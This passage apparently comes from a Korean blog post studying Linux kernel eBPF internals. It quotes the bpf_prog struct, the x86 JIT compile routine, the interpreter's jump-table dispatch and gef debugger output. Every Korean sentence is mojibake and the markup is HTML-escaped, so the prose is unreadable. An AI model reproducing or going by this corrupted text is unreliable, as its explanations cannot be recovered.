		stats = this_cpu_ptr(prog-&amp;gt;aux-&amp;gt;stats);		\
		u64_stats_update_begin(&amp;amp;stats-&amp;gt;syncp);		\
		stats-&amp;gt;cnt++;					\
		stats-&amp;gt;nsecs += sched_clock() - start;		\
		u64_stats_update_end(&amp;amp;stats-&amp;gt;syncp);		\
	} else {						\
		ret = (*(prog)-&amp;gt;bpf_func)(ctx, (prog)-&amp;gt;insnsi);	\
	}							\
	ret; })
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ret = (*(prog)-&amp;gt;bpf_func)(ctx, (prog)-&amp;gt;insnsi);&lt;/code&gt;ë¡œ ì‹¤í–‰í•œë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;prog&lt;/code&gt;ì˜ êµ¬ì¡°ì²´&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;pages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Number of allocated pages */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;jited&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Is our filter JIT'ed? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;jit_requested:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* archs need to JIT the prog */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;gpl_compatible:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Is filter GPL compatible? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;cb_access:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Is control block accessed? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;dst_needed:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Do we need dst entry? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;blinded:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Was blinded */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;is_func:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* program is a bpf function */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;kprobe_override:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Do we override a kprobe? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;has_callchain_buf:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* callchain buffer allocated? */&lt;/span&gt;
				&lt;span class=&quot;nl&quot;&gt;enforce_expected_attach_type:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Enforce expected_attach_type checking at attach time */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_type&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Type of BPF program */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_attach_type&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;expected_attach_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* For some prog types */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Number of filter blocks */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;jited_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Size of jited insns in bytes */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u8&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_TAG_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_aux&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Auxiliary fields */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_fprog_kern&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orig_prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Original BPF program */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
					    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* Instructions for interpreter */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_filter&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;insns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_insn&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;insnsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë°”ì´íŠ¸ ì½”ë“œë“¤ì€ JITì»´íŒŒì¼ ë˜ì–´ ì„¸íŒ…í•˜ê²Œ ëœë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;/arch/x86/net/bpf_jit_comp32.c&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bpf_int_jit_compile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_binary_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orig_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldproglen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jit_context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_blinded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;addrs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmalloc_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * JITed image shrinks with every pass and the loop iterates
	 * until the image stops shrinking. Very large BPF programs
	 * may converge on the last pass. In such case do one more
	 * pass to emit the final image.
	 */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_jit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldproglen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;oldproglen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cond_resched&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_jit_enable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;bpf_jit_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;bpf_jit_binary_lock_ro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jited&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jited_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proglen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JIT ì»´íŒŒì¼ ëœ ì½”ë“œëŠ” ì´ëŸ° ì‹¤í–‰ í•¨ìˆ˜ì—ì„œ ì‹¤í–‰ë˜ê²Œ ëœë‹¤. ctfì—ì„œ ìì£¼ë³´ë˜ vmê³¼ ë™ì¼í•˜ê²Œ ìƒê²¼ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__no_fgcse&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;___bpf_prog_run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define BPF_INSN_2_LBL(x, y)    [BPF_##x | BPF_##y] = &amp;amp;&amp;amp;x##_##y
&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;select_insn:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jumptable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* ALU */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define ALU(OPCODE, OP)			\
	ALU64_##OPCODE##_X:		\
		DST = DST OP SRC;	\
		CONT;			\
	ALU_##OPCODE##_X:		\
		DST = (u32) DST OP (u32) SRC;	\
		CONT;			\
	ALU64_##OPCODE##_K:		\
		DST = DST OP IMM;		\
		CONT;			\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì•„ë˜ë¶€í„°ëŠ” ì‹¤ì œ ì½”ë“œ ì˜ˆì‹œ.&lt;/p&gt;

&lt;p&gt;input eBPF code: &lt;code class=&quot;highlighter-rouge&quot;&gt;BPF_LD_MAP_FD(BPF_REG_9, mapfd)&lt;/code&gt;. insn â‡’ JIT ì»´íŒŒì¼ í›„ ë‚˜ì˜¨ ì½”ë“œ&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â¤&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dst_reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;src_reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x607c000&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;gotoë¬¸ìœ¼ë¡œ ì¸í•´ íŠ¹ì • ì£¼ì†Œë¡œ ì í”„&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â¤&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jumptable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
